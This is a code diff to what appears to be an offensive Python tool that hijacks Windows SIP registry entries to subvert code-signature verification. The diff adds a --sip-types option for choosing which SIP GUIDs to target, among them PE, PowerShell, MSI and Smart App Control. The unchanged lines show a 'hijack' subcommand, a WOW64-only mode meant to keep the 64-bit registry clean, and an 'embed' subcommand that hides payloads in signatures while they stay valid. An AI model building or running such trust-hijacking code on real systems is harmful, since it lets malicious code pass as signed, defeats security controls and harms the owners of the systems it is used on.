@@ -168,6 +168,8 @@ SIPS = {
     "ESD": "{9F3053C5-439D-4BF7-8A77-04F0450A1D9F}",
 }
 
+DEFAULT_SIP_TYPES = ["PE", "PowerShell", "MSI"]
+
 # Smart App Control SIP (Win11 only, separate from standard SIP hijack)
 SAC_SIP = {
     "SmartAppControl": "{18B3C141-AE0D-40F9-9465-E542AFC1ABC7}",
@@ -177,6 +179,9 @@ SAC_SIP = {
 WIN11_SIPS = {
     "AppXExtensions": "{1AD2DCB4-B636-4E9A-847A-AA8E0E540E93}",
 }
+
+ALL_SIPS = {**SIPS, **SAC_SIP, **WIN11_SIPS}
+SIP_NAMES = sorted(ALL_SIPS.keys())
 
 KEYS = []
 for name, guid in SIPS.items():
@@ -758,6 +763,7 @@ def main():
     hijack_parser.add_argument("--wow64-only", action="store_true", help="Write only to WOW6432Node (hijacks 32-bit callers, 64-bit registry stays clean)")
     hijack_parser.add_argument("--sac", action="store_true", help="Include Smart App Control SIP (Win11 only, GUID 18B3C141)")
     hijack_parser.add_argument("--all-sips", action="store_true", help="Include all 19 SIP GUIDs (standard + SAC + Win11-only)")
+    hijack_parser.add_argument("--sip-types", help=f"Comma-separated SIP types to target (default: PE,PowerShell,MSI). Use 'all' for all 17 standard SIPs. Available: {','.join(sorted(SIPS.keys()))}")
 
     # Subcommand: embed
     embed_parser = subparsers.add_parser("embed", help="Embed payload in PKCS#7 unauthenticated attributes (signature stays valid)")
@@ -883,13 +889,32 @@ def main():
         else:
             config = HIJACK_CONFIG if args.action == "hijack" else CLEAN_CONFIG
             # Build SIP set based on flags
-            active_sips = dict(SIPS)
-            if getattr(args, 'sac', False) or getattr(args, 'all_sips', False):
+            sip_types_arg = getattr(args, 'sip_types', None)
+            if getattr(args, 'all_sips', False):
+                active_sips = dict(ALL_SIPS)
+                print(f"[*] All {len(active_sips)} SIP GUIDs targeted.")
+            elif sip_types_arg:
+                if sip_types_arg.lower() == 'all':
+                    active_sips = dict(SIPS)
+                    print(f"[*] All {len(active_sips)} standard SIP GUIDs targeted.")
+                else:
+                    requested = [t.strip() for t in sip_types_arg.split(',')]
+                    active_sips = {}
+                    for t in requested:
+                        # Case-insensitive lookup
+                        match = next((k for k in ALL_SIPS if k.lower() == t.lower()), None)
+                        if match:
+                            active_sips[match] = ALL_SIPS[match]
+                        else:
+                            print(f"[-] Unknown SIP type: {t}. Available: {','.join(sorted(ALL_SIPS.keys()))}")
+                            sys.exit(1)
+                    print(f"[*] Targeting {len(active_sips)} SIP(s): {', '.join(active_sips.keys())}")
+            else:
+                active_sips = {k: SIPS[k] for k in DEFAULT_SIP_TYPES}
+                print(f"[*] Default SIP targets: {', '.join(active_sips.keys())} (use --sip-types to change)")
+            if getattr(args, 'sac', False) and 'SmartAppControl' not in active_sips:
                 active_sips.update(SAC_SIP)
                 print("[!] Smart App Control SIP included (Win11 only).")
-            if getattr(args, 'all_sips', False):
-                active_sips.update(WIN11_SIPS)
-                print(f"[*] All {len(active_sips)} SIP GUIDs targeted.")
             # Build key list based on --wow64-only
             keys = []
             for name, guid in active_sips.items():
